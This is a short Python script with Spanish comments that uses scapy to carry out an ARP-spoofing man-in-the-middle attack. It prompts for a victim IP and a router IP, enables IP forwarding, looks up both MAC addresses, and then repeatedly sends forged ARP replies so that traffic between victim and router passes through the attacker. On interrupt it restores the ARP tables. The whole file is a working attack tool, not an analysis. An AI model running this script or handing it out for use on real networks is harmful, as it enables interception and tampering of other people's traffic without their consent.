#El siguiente programa en Python consiste en conocer la MAC tanto de la victima como del router
#Realizamos las importaciones necesarias
import os
import time
import sys
from scapy.all import *
from scapy.layers.inet import *

def obtenerInformacion():
	print("Obteniendo direcciones")
	interface = input("Interface (en0 is Macbook Wifi):")
	victimaIP = input("IP de la victima:")
	routerIP = input("IP del router:")
	return [interface, victimaIP, routerIP]

def confIPReenvio(toggle):
	if(toggle == True):
		print("~~~Turing en el reenvio de IP")
		os.system('sysctl -w net.inet.ip.forwarding=1')

	if(toggle == False):
		print("~~~Turing off en el reenvio de IP...")
		os.system('sysctl -w net.inet.ip.forwarding=0')


def obtener_MAC(ip, interface):
	answer, unanswer = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = ip), timeout = 2, iface=interface, inter = 0.1)
	for send,recieve in answer:
		return recieve.sprintf(r"%Ether.src%")
#Restablece la conexion entre la victima y el router en la capa de enlace de datos.
def reasignacionARP(victimaIP, routerIP, interface):
	print("Reasignacion de ARPS")
	victimaMAC = obtener_MAC(victimaIP, interface)	
	routerMAC = obtener_MAC(routerIP, interface)
	send(ARP(op=2, pdst=routerIP, psrc=victimaIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimaMAC, retry=7))
	send(ARP(op=2, pdst=victimaIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC, retry=7))
	confIPReenvio(False)

def ataque(victimIP, victimMAC, routerIP, routerMAC):
	send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
	send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))

def manInTheMiddle():
	info = obtenerInformacion()
	confIPReenvio(True)
	print("Obteniendo MACs")
	try:
		victimaMAC = obtener_MAC(info[1], info[0])
	except Exception as e:
		confIPReenvio(False)
		print("Error al obtener MAC de la victima")
		print(e)
		sys.exit(1)

	try:
		routerMAC = obtener_MAC(info[2], info[0])
	except Exception as e:
		confIPReenvio(False)
		print("Error al obtener MAC del router~!~Error getting router MAC...")
		print(e)
		sys.exit(1)
	print("MAC de la victima: %s" % victimaMAC)
	print("MAc del router: %s" % routerMAC)
	print("ATACANDO")
	while True:
		try:
			ataque(info[1], victimaMAC, info[2], routerMAC)
			time.sleep(1.5)
		except KeyboardInterrupt:
			reasignacionARP(info[1], info[2], info[0])
			break
	sys.exit(1)

manInTheMiddle()